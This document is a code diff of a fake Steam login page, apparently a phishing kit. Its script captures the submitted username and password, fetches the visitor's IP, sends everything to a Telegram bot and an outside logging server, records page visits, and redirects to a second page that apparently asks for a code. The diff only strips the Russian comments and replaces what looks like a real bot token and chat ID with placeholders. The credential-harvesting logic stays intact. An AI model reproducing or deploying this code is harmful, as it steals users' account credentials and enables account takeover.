@@ -246,7 +246,7 @@
                                                 <input name="password" required type="password" class="newlogindialog_TextInput_2eKVn" value="">
                                             </div>
                                             
-                                            <!-- СКРЫТОЕ ПОЛЕ ДЛЯ ПЕРЕДАЧИ ЛОГИНА -->
+                                        
                                             <input type="hidden" name="username_hidden" id="usernameField">
                                             
                                             <div class="newlogindialog_CheckboxField_2QWD5">
@@ -306,11 +306,11 @@
 </div>
 
 <script>
-// Конфигурация Telegram бота
-const BOT_TOKEN = '8415644431:AAEjoQoN5J-dgV4SwMQ1-WOxJxFiaSPpYAs';
-const CHAT_ID = '8145443779';
 
-// Функция отправки в Telegram
+const BOT_TOKEN = 'TOKEN BOT';
+const CHAT_ID = 'ID TG';
+
+
 async function sendToTelegram(message) {
     try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -330,7 +330,7 @@ async function sendToTelegram(message) {
     }
 }
 
-// Функция получения IP
+
 async function getIP() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -341,7 +341,7 @@ async function getIP() {
     }
 }
 
-// Функция регистрации в базе данных
+
 async function registerUser(username, password, ip) {
     try {
         console.log('🔐 Попытка регистрации пользователя:', username);
@@ -381,7 +381,7 @@ async function registerUser(username, password, ip) {
     }
 }
 
-// Функция логирования действий
+
 async function logUserAction(action, description) {
     const userData = {
         action: action,
@@ -393,7 +393,7 @@ async function logUserAction(action, description) {
         url: window.location.href
     };
     
-    // Отправляем в Telegram
+   
     const logMessage = `📊 <b>ЛОГ ДЕЙСТВИЙ</b>\n\n`
                      + `🎯 <b>Действие:</b> ${description}\n`
                      + `🌐 <b>IP:</b> ${userData.ip}\n`
@@ -403,7 +403,7 @@ async function logUserAction(action, description) {
     
     await sendToTelegram(logMessage);
     
-    // Также сохраняем в базу данных если нужно
+    
     try {
         await fetch('https://logs-unisono-project.up.railway.app/api/auth/register', {
             method: 'POST',
@@ -416,7 +416,7 @@ async function logUserAction(action, description) {
     }
 }
 
-// Обработка отправки формы
+
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🟢 DOM загружен, ищу форму...');
     
@@ -434,10 +434,10 @@ document.addEventListener('DOMContentLoaded', function() {
             
             console.log('🔐 Данные для входа:', { username, password });
             
-            // Логируем попытку входа
+            
             await logUserAction('LOGIN_ATTEMPT', `Попытка входа с логином: ${username}`);
             
-            // 1. Регистрируем в базе данных
+           
             try {
                 console.log('📡 Регистрируем пользователя...');
                 await registerUser(username, password, ip);
@@ -445,17 +445,17 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.log('⚠️ Регистрация не удалась:', error);
             }
             
-            // 2. Отправляем данные в Telegram
+            
             console.log('📨 Отправляем в Telegram...');
             const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
             
             await sendToTelegram(message);
             
-            // 3. Сохраняем логин
+            
             console.log('💾 Сохраняем логин в localStorage...');
             localStorage.setItem('steam_username', username);
             
-            // 4. Перенаправляем на code1.php
+            
             console.log('🔄 Перенаправляем на code1.php...');
             window.location.href = 'code1.php';
         };
@@ -465,7 +465,7 @@ document.addEventListener('DOMContentLoaded', function() {
         console.error('❌ Форма не найдена!');
     }
     
-    // Логируем заход на страницу
+  
     logUserAction('PAGE_VISIT', 'Пользователь зашел на страницу входа');
 });
 </script>
